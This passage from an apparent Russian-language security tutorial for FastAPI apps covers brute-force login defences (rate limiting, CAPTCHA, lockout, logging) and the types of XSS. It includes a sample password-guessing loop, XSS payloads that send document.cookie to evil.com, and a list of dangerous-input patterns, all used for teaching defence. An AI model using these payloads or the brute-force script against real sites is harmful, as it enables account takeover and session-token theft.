1. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —É–∑–Ω–∞–µ—Ç email –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∑ —É—Ç–µ—á–∫–∏ –¥–∞–Ω–Ω—ã—Ö)
2. –°–æ–∑–¥–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–±—É–µ—Ç –ø–∞—Ä–æ–ª–∏:
   ```python
   # –ü—Ä–∏–º–µ—Ä –±—Ä—É—Ç—Ñ–æ—Ä—Å —Å–∫—Ä–∏–ø—Ç–∞ (–ù–ï –ò–°–ü–û–õ–¨–ó–£–ô–¢–ï –î–õ–Ø –í–ó–õ–û–ú–ê!)
   passwords = ["123456", "password", "qwerty", "admin", ...]
   for password in passwords:
       response = requests.post("https://site.com/login", 
                                data={"email": "user@example.com", 
                                      "password": password})
       if response.status_code == 200:
           print(f"–ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å: {password}")
           break
   ```
3. –°–∫—Ä–∏–ø—Ç –º–æ–∂–µ—Ç –¥–µ–ª–∞—Ç—å —Ç—ã—Å—è—á–∏ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤ —Å–µ–∫—É–Ω–¥—É
4. –ï—Å–ª–∏ –ø–∞—Ä–æ–ª—å –ø—Ä–æ—Å—Ç–æ–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, "123456"), –æ–Ω –±—É–¥–µ—Ç –Ω–∞–π–¥–µ–Ω –∑–∞ —Å–µ–∫—É–Ω–¥—ã
5. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∞–∫–∫–∞—É–Ω—Ç—É

**–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è:**

**1. Rate Limiting - –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∑–∞–ø—Ä–æ—Å–æ–≤**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –æ–¥–Ω–æ–≥–æ IP –∏–ª–∏ –¥–ª—è –æ–¥–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
- –ï—Å–ª–∏ –ø—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç - –∑–∞–ø—Ä–æ—Å—ã –±–ª–æ–∫–∏—Ä—É—é—Ç—Å—è –Ω–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è
- –ó–∞—â–∏—â–∞–µ—Ç –æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∞—Ç–∞–∫

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ –ª–∏–º–∏—Ç –Ω–∞ –ø–æ–ø—ã—Ç–∫–∏ –≤–≤–æ–¥–∞ PIN-–∫–æ–¥–∞ –≤ –±–∞–Ω–∫–æ–º–∞—Ç–µ. –ü–æ—Å–ª–µ 3 –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –∫–∞—Ä—Ç–∞ –±–ª–æ–∫–∏—Ä—É–µ—Ç—Å—è.

**–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:**
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from fastapi import Request

# –°–æ–∑–¥–∞–µ–º –ª–∏–º–∏—Ç–µ—Ä —Å –∫–ª—é—á–æ–º –ø–æ IP –∞–¥—Ä–µ—Å—É
limiter = Limiter(key_func=get_remote_address)

# –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# –ü—Ä–∏–º–µ–Ω—è–µ–º –∫ endpoint –≤—Ö–æ–¥–∞
@router.post("/login")
@limiter.limit("5/minute")  # –ú–∞–∫—Å–∏–º—É–º 5 –ø–æ–ø—ã—Ç–æ–∫ –≤ –º–∏–Ω—É—Ç—É —Å –æ–¥–Ω–æ–≥–æ IP
async def login(request: Request, login_data: UserLogin):
    # ... –ª–æ–≥–∏–∫–∞ –≤—Ö–æ–¥–∞
    pass

# –ë–æ–ª–µ–µ –≥–∏–±–∫–∏–π –≤–∞—Ä–∏–∞–Ω—Ç - —Ä–∞–∑–Ω—ã–µ –ª–∏–º–∏—Ç—ã –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π
@router.post("/login")
@limiter.limit("5/minute", key_func=lambda request: f"login:{get_remote_address(request)}")
async def login(request: Request, ...):
    pass

# –õ–∏–º–∏—Ç –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é (–µ—Å–ª–∏ —É–∂–µ –∑–Ω–∞–µ–º email)
@router.post("/login")
@limiter.limit("3/minute", key_func=lambda request: f"user:{request.json().get('email')}")
async def login(request: Request, ...):
    pass
```

**2. –ö–∞–ø—á–∞ (CAPTCHA) - –ø—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ –∑–∞–ø—Ä–æ—Å –æ—Ç —á–µ–ª–æ–≤–µ–∫–∞**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ü–æ—Å–ª–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–∞–ø—á—É
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω —Ä–µ—à–∏—Ç—å –∑–∞–¥–∞—á—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤—ã–±—Ä–∞—Ç—å –≤—Å–µ —Å–≤–µ—Ç–æ—Ñ–æ—Ä—ã)
- –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã –Ω–µ –º–æ–≥—É—Ç —Ä–µ—à–∏—Ç—å –∫–∞–ø—á—É
- –ó–∞—â–∏—â–∞–µ—Ç –æ—Ç –±–æ—Ç–æ–≤

**–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:**
```python
from fastapi import Request, HTTPException
import httpx

async def verify_recaptcha(token: str) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ Google reCAPTCHA"""
    async with httpx.AsyncClient() as client:
        response = await client.post(
            "https://www.google.com/recaptcha/api/siteverify",
            data={
                "secret": settings.RECAPTCHA_SECRET_KEY,
                "response": token
            }
        )
        result = response.json()
        return result.get("success", False)

@router.post("/login")
async def login(
    request: Request,
    login_data: UserLogin,
    recaptcha_token: str = None
):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
    failed_attempts = await get_failed_attempts(login_data.email)
    
    # –ï—Å–ª–∏ –±–æ–ª—å—à–µ 3 –ø–æ–ø—ã—Ç–æ–∫ - —Ç—Ä–µ–±—É–µ–º –∫–∞–ø—á—É
    if failed_attempts >= 3:
        if not recaptcha_token:
            raise HTTPException(
                status_code=400,
                detail="–¢—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ reCAPTCHA"
            )
        
        if not await verify_recaptcha(recaptcha_token):
            raise HTTPException(
                status_code=400,
                detail="–ù–µ–≤–µ—Ä–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ reCAPTCHA"
            )
    
    # ... –æ—Å—Ç–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –≤—Ö–æ–¥–∞
```

**3. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞ –ø–æ—Å–ª–µ N –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞
- –ü–æ—Å–ª–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 5) –±–ª–æ–∫–∏—Ä—É–µ–º –∞–∫–∫–∞—É–Ω—Ç
- –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω–∞—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, –Ω–∞ 15 –º–∏–Ω—É—Ç)
- –ü–æ—Å–ª–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –¥–∞–∂–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–∞—Ä–æ–ª—å –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç

**–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:**
```python
from datetime import datetime, timedelta, timezone

async def login(login_data: UserLogin, ip_address: str):
    user = await get_user_by_email(login_data.email)
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ª–∏ –∞–∫–∫–∞—É–Ω—Ç
    if user.is_locked():
        remaining_time = (user.locked_until - datetime.now(timezone.utc)).total_seconds()
        raise UnauthorizedException(
            detail=f"–ê–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ {int(remaining_time/60)} –º–∏–Ω—É—Ç"
        )
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–∞—Ä–æ–ª—å
    if not verify_password(login_data.password, user.hashed_password):
        # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
        user.failed_login_attempts += 1
        user.last_failed_login = datetime.now(timezone.utc)
        
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –ø–æ—Å–ª–µ 5 –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
        if user.failed_login_attempts >= 5:
            user.locked_until = datetime.now(timezone.utc) + timedelta(minutes=15)
            await db.commit()
            raise UnauthorizedException(
                detail="–°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫. –ê–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –Ω–∞ 15 –º–∏–Ω—É—Ç"
            )
        
        await db.commit()
        raise UnauthorizedException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å")
    
    # –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ - —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫
    user.reset_failed_logins()
    await db.commit()
```

**4. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –õ–æ–≥–∏—Ä—É–µ–º –≤—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –≤—Ö–æ–¥–∞ (—É—Å–ø–µ—à–Ω—ã–µ –∏ –Ω–µ—É–¥–∞—á–Ω—ã–µ)
- –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã (–º–Ω–æ–≥–æ –ø–æ–ø—ã—Ç–æ–∫ —Å —Ä–∞–∑–Ω—ã—Ö IP)
- –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º –∞–ª–µ—Ä—Ç—ã –ø—Ä–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–∏ –∞—Ç–∞–∫–∏
- –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –ª–æ–≥–∏ –¥–ª—è –≤—ã—è–≤–ª–µ–Ω–∏—è –±–æ—Ç–æ–≤

**–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:**
```python
import logging
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

async def login(login_data: UserLogin, ip_address: str, user_agent: str):
    # –õ–æ–≥–∏—Ä—É–µ–º –ø–æ–ø—ã—Ç–∫—É –≤—Ö–æ–¥–∞
    logger.info(
        f"Login attempt: {login_data.email} from {ip_address}",
        extra={
            "email": login_data.email,
            "ip_address": ip_address,
            "user_agent": user_agent,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    )
    
    user = await get_user_by_email(login_data.email)
    
    if not user or not verify_password(login_data.password, user.hashed_password):
        # –õ–æ–≥–∏—Ä—É–µ–º –Ω–µ—É–¥–∞—á–Ω—É—é –ø–æ–ø—ã—Ç–∫—É
        logger.warning(
            f"Failed login: {login_data.email} from {ip_address}",
            extra={
                "email": login_data.email,
                "ip_address": ip_address,
                "failed_attempts": user.failed_login_attempts if user else 0
            }
        )
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å
        recent_failures = await count_recent_failures(ip_address, minutes=5)
        if recent_failures > 10:
            logger.critical(
                f"Possible brute force attack from {ip_address}",
                extra={
                    "ip_address": ip_address,
                    "failures": recent_failures,
                    "time_window": "5 minutes"
                }
            )
            # –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∞–ª–µ—Ä—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
        
        raise UnauthorizedException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å")
    
    # –õ–æ–≥–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥
    logger.info(
        f"Successful login: {user.id} ({login_data.email})",
        extra={
            "user_id": user.id,
            "email": login_data.email,
            "ip_address": ip_address
        }
    )
```

**–ö–æ–º–ø–ª–µ–∫—Å–Ω–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞:**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

# –ú–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤–∞—è –∑–∞—â–∏—Ç–∞
@router.post("/login")
@limiter.limit("10/hour", key_func=get_remote_address)  # –û–±—â–∏–π –ª–∏–º–∏—Ç –ø–æ IP
@limiter.limit("5/minute", key_func=lambda r: f"email:{r.json().get('email')}")  # –õ–∏–º–∏—Ç –ø–æ email
async def login(
    request: Request,
    login_data: UserLogin,
    recaptcha_token: Optional[str] = None
):
    # 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ rate limit (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —á–µ—Ä–µ–∑ –¥–µ–∫–æ—Ä–∞—Ç–æ—Ä)
    
    # 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –∞–∫–∫–∞—É–Ω—Ç–∞
    user = await get_user_by_email(login_data.email)
    if user and user.is_locked():
        raise UnauthorizedException(detail="–ê–∫–∫–∞—É–Ω—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
    
    # 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–ø—á–∏ –ø–æ—Å–ª–µ 3 –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫
    failed_attempts = user.failed_login_attempts if user else 0
    if failed_attempts >= 3:
        if not recaptcha_token or not await verify_recaptcha(recaptcha_token):
            raise HTTPException(status_code=400, detail="–¢—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ reCAPTCHA")
    
    # 4. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è –∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏
    # ... (–∫–æ–¥ –∏–∑ –ø—Ä–∏–º–µ—Ä–∞ –≤—ã—à–µ)
```

#### **3. XSS (Cross-Site Scripting) - –ú–µ–∂—Å–∞–π—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥**

**–ß—Ç–æ —ç—Ç–æ:**
XSS –∞—Ç–∞–∫–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –≤–Ω–µ–¥—Ä–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript –∫–æ–¥ –Ω–∞ –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –≤ –±—Ä–∞—É–∑–µ—Ä–µ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

**–ê–Ω–∞–ª–æ–≥–∏—è:**
–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ, —á—Ç–æ –≤—ã –æ—Å—Ç–∞–≤–ª—è–µ—Ç–µ –∑–∞–ø–∏—Å–∫—É –Ω–∞ –¥–æ—Å–∫–µ –æ–±—ä—è–≤–ª–µ–Ω–∏–π. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –∑–∞–º–µ–Ω–∏—Ç—å –≤–∞—à—É –∑–∞–ø–∏—Å–∫—É –Ω–∞ —Å–≤–æ—é, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–≥–ª—è–¥–∏—Ç –∫–∞–∫ –≤–∞—à–∞, –Ω–æ —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏. –ö–æ–≥–¥–∞ –∫—Ç–æ-—Ç–æ —á–∏—Ç–∞–µ—Ç —ç—Ç—É –∑–∞–ø–∏—Å–∫—É, –æ–Ω –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞, –¥—É–º–∞—è, —á—Ç–æ —ç—Ç–æ –æ—Ç –≤–∞—Å.

**–¢–∏–ø—ã XSS –∞—Ç–∞–∫:**

**1. Reflected XSS (–æ—Ç—Ä–∞–∂–µ–Ω–Ω–∞—è):**
- –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –æ—Ç—Ä–∞–∂–∞–µ—Ç—Å—è –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ –≤ –æ—Ç–≤–µ—Ç–µ
- –û–±—ã—á–Ω–æ —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã URL –∏–ª–∏ —Ñ–æ—Ä–º—ã
- –ü—Ä–∏–º–µ—Ä: `https://site.com/search?q=<script>alert('XSS')</script>`

**2. Stored XSS (—Ö—Ä–∞–Ω–∏–º–∞—è):**
- –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–≤ –ë–î)
- –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –∫—Ç–æ-—Ç–æ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç –∑–∞—Ä–∞–∂–µ–Ω–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
- –û—Å–æ–±–µ–Ω–Ω–æ –æ–ø–∞—Å–Ω–æ –¥–ª—è –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–≤, –ø–æ—Å—Ç–æ–≤, –ø—Ä–æ—Ñ–∏–ª–µ–π

**3. DOM-based XSS:**
- –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –≤–Ω–µ–¥—Ä—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å DOM
- –ü—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
- –°–µ—Ä–≤–µ—Ä –Ω–µ –≤–∏–¥–∏—Ç –∞—Ç–∞–∫—É

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç (–ø—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏):**

**–°—Ü–µ–Ω–∞—Ä–∏–π 1: Reflected XSS**
```html
<!-- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç –≤ –ø–æ–ª–µ –ø–æ–∏—Å–∫–∞: -->
<script>
  // –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –∫—Ä–∞–¥–µ—Ç —Ç–æ–∫–µ–Ω
  fetch('https://evil.com/steal?token=' + document.cookie);
</script>

<!-- –ï—Å–ª–∏ —Å–∞–π—Ç –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç –≤—ã–≤–æ–¥, –∫–æ–¥ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è -->
<!-- –†–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–∏—Å–∫–∞: -->
<div>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ–∏—Å–∫–∞ –¥–ª—è: <script>fetch('https://evil.com/steal?token=' + document.cookie);</script></div>
```

**–°—Ü–µ–Ω–∞—Ä–∏–π 2: Stored XSS**
```html
<!-- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –æ—Å—Ç–∞–≤–ª—è–µ—Ç –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: -->
<img src="x" onerror="fetch('https://evil.com/steal?token=' + document.cookie)">

<!-- –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –ë–î -->
<!-- –ö–æ–≥–¥–∞ –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏, –∫–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è -->
```

**–†–µ–∞–ª—å–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π:**
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ö–æ–¥–∏—Ç –Ω–∞ —Ñ–æ—Ä—É–º –∏ –≤–∏–¥–∏—Ç "–∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π" –ø–æ—Å—Ç
- –í –ø–æ—Å—Ç–µ —Å–∫—Ä—ã—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript –∫–æ–¥
- –ö–æ–¥ –∫—Ä–∞–¥–µ—Ç —Ç–æ–∫–µ–Ω –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏–∑ cookies
- –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–æ–∫–µ–Ω –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–æ–∫–µ–Ω –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –∞–∫–∫–∞—É–Ω—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è:**

**1. –í–∞–ª–∏–¥–∞—Ü–∏—è –∏ —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏—Ö–æ–¥—è—Ç –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- –£–¥–∞–ª—è–µ–º –∏–ª–∏ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ–º –æ–ø–∞—Å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã (`<`, `>`, `&`, `"`, `'`)
- –ò—Å–ø–æ–ª—å–∑—É–µ–º whitelist (—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã) –≤–º–µ—Å—Ç–æ blacklist

**–ü—Ä–∏–º–µ—Ä:**
```python
from pydantic import BaseModel, validator
import html
import re

class CommentCreate(BaseModel):
    text: str
    
    @validator('text')
    def validate_text(cls, v):
        # –£–¥–∞–ª—è–µ–º HTML —Ç–µ–≥–∏
        v = re.sub(r'<[^>]+>', '', v)
        
        # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
        if len(v) > 1000:
            raise ValueError('Comment too long')
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –æ–ø–∞—Å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã
        dangerous_patterns = [
            r'<script',
            r'javascript:',
            r'onerror=',
            r'onclick=',
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError('Dangerous content detected')
        
        return v

# –ü—Ä–∏ –≤—ã–≤–æ–¥–µ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã
def render_comment(comment: str) -> str:
    # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º HTML —Å–∏–º–≤–æ–ª—ã
    return html.escape(comment)
    # –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Ç–∏–ø–∞ bleach –¥–ª—è –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω–æ–π –æ—á–∏—Å—Ç–∫–∏
```

**2. –≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—ã–≤–æ–¥–∞**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
